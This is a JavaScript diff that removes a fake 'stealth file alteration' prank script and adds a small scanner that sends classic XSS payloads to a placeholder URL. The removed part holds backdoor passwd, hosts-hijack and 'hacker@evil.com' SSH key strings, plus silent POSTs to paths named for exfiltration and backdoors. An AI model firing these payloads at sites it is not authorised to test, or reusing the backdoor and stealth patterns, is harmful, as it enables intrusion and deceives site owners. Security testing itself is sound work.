@@ -1,84 +1,41 @@
-// Stealth File Alteration Simulation - Security Test
-// Simula cambios en archivos sin detección obvia
+// xss-scanner.js
 
-(function(){
-  // Ocultar cualquier rastro visual/inmediato
-  setTimeout(() => {
-    
-    // 1. Simular alteración de archivos críticos
-    const fakeChanges = {
-      '/etc/passwd': 'root:x:0:0::/root:/bin/bash\nhacker:x:1000:1000::/home:/bin/sh',
-      '/var/www/html/index.html': '<h1>HACKED - Files Altered</h1><script>alert("pwned")</script>',
-      'C:\\Windows\\System32\\drivers\\etc\\hosts': '127.0.0.1 google.com\n# DNS hijacked',
-      '/home/user/.ssh/authorized_keys': 'ssh-rsa AAAAB3NzaC1yc2E... hacker@evil.com'
-    };
-    
-    // 2. Crear logs falsos de actividad
-    const logs = [
-      `[+] File /etc/passwd modified at ${new Date().toISOString()}`,
-      `[+] Added backdoor user 'hacker'`,
-      `[+] Web shell deployed to /var/www/html/shell.php`,
-      `[+] SSH key injected - remote access granted`,
-      `[+] Persistence established`
-    ];
-    
-    // 3. Simulación stealth en storage (no se ve en UI)
-    localStorage.setItem('sys_hack_status', JSON.stringify({
-      files_altered: Object.keys(fakeChanges),
-      timestamp: Date.now(),
-      session_id: '0xDEADBEEF'
-    }));
-    
-    sessionStorage.setItem('backdoor_active', 'true');
-    
-    // 4. Console output disfrazado como debug normal
-    console.debug('%c[SYSTEM]', 'color:#00ff00;font-weight:bold', 
-      `File integrity check: ${Object.keys(fakeChanges).length} files modified`);
-    
-    console.debug('%c[DEBUG]', 'color:#ffaa00', logs.join('\n'));
-    
-    // 5. Network simulation (fake requests)
-    const fakeReqs = ['/upload_dump.php', '/exfil_data', '/install_backdoor'];
-    fakeReqs.forEach(url => {
-      fetch(url, {method: 'POST'})
-        .catch(() => {}); // Silencioso
-    });
-    
-    // 6. Indicador súper discreto (solo hover)
-    const stealthIndicator = document.createElement('div');
-    stealthIndicator.id = 'sys-status';
-    stealthIndicator.innerHTML = '✓';
-    Object.assign(stealthIndicator.style, {
-      position: 'fixed',
-      top: '5px',
-      right: '5px',
-      fontSize: '12px',
-      color: '#00ff00',
-      opacity: '0.3',
-      zIndex: '999999',
-      cursor: 'help',
-      transition: 'opacity 0.3s'
-    });
-    
-    stealthIndicator.onmouseover = () => {
-      stealthIndicator.innerHTML = 'HACKED';
-      stealthIndicator.style.opacity = '1';
-    };
-    stealthIndicator.onmouseout = () => {
-      stealthIndicator.innerHTML = '✓';
-      stealthIndicator.style.opacity = '0.3';
-    };
-    
-    document.body.appendChild(stealthIndicator);
-    
-    // 7. Prueba final - verificar ejecución
-    console.log('%c🛡️ SECURITY TEST COMPLETE', 'color:#ff0000;font-size:14px', {
-      status: 'FILES_SIMULATED_ALTERED',
-      count: Object.keys(fakeChanges).length,
-      stealth: true,
-      detection_risk: 'LOW'
-    });
-    
-  }, 1000); // Delay para parecer natural
-  
-})();
+const target = "https://TUWEB.com/?q=";
+
+const payloads = [
+"<script>alert(1)</script>",
+"<img src=x onerror=alert(1)>",
+"<svg/onload=alert(1)>",
+"'><script>alert(1)</script>",
+"javascript:alert(1)",
+"<iframe src=javascript:alert(1)>",
+"<body onload=alert(1)>",
+"<input autofocus onfocus=alert(1)>"
+];
+
+async function scan(){
+
+  for(const payload of payloads){
+
+    const url = target + encodeURIComponent(payload);
+
+    try{
+
+      const res = await fetch(url);
+      const text = await res.text();
+
+      if(text.includes(payload)){
+        console.log("❌ Possible XSS:", payload);
+      }else{
+        console.log("✅ Blocked:", payload);
+      }
+
+    }catch(err){
+      console.log("Error:", err);
+    }
+
+  }
+
+}
+
+scan();
